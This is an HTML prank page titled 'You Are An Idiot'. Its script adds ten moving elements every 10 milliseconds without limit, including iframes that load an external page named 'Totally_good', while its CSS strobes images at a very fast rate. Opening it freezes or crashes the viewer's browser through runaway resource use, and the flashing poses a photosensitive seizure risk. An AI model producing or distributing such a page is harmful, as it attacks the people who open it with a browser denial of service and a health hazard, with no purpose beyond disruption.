<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Are An Idiot</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background-color: black;
        }
        .moving-image {
            position: absolute;
            animation: moveImage 0.05s linear infinite,
                       rotateImage 0.05s linear infinite,
                       flashImage 0.005s alternate infinite;
        }
        .moving-window {
            position: absolute;
            animation: moveWindow 0.1s linear infinite;
        }
        @keyframes moveImage {
            0% {
                transform: translate(0, 0);
            }
            25% {
                transform: translate(50px, 0);
            }
            50% {
                transform: translate(50px, 50px);
            }
            75% {
                transform: translate(0, 50px);
            }
            100% {
                transform: translate(0, 0);
            }
        }
        @keyframes rotateImage {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        @keyframes flashImage {
            0% {
                opacity: 1;
            }
            100% {
                opacity: 0;
            }
        }
        @keyframes moveWindow {
            0% {
                transform: translate(0, 0);
            }
            25% {
                transform: translate(50px, 0);
            }
            50% {
                transform: translate(50px, 50px);
            }
            75% {
                transform: translate(0, 50px);
            }
            100% {
                transform: translate(0, 0);
            }
        }
    </style>
</head>
<body>
    <script>
        function createMovingImagesAndWindows() {
            const numberOfItems = 10; // Increase the number of items
            for (let i = 0; i < numberOfItems; i++) {
                const item = document.createElement('div');
                item.className = i % 2 === 0 ? 'moving-image' : 'moving-window';
                item.style.left = Math.random() * window.innerWidth + 'px';
                item.style.top = Math.random() * window.innerHeight + 'px';

                if (item.className === 'moving-window') {
                    const iframe = document.createElement('iframe');
                    iframe.src = 'https://movieboxc17.github.io/Totally_good/'; // Replace with the website URL
                    iframe.style.width = '200px';
                    iframe.style.height = '150px';
                    item.appendChild(iframe);
                }

                document.body.appendChild(item);
            }
        }

        // Create multiple moving items every 0.01 seconds (adjust the interval as needed)
        setInterval(createMovingImagesAndWindows, 10);
    </script>
</body>
</html>
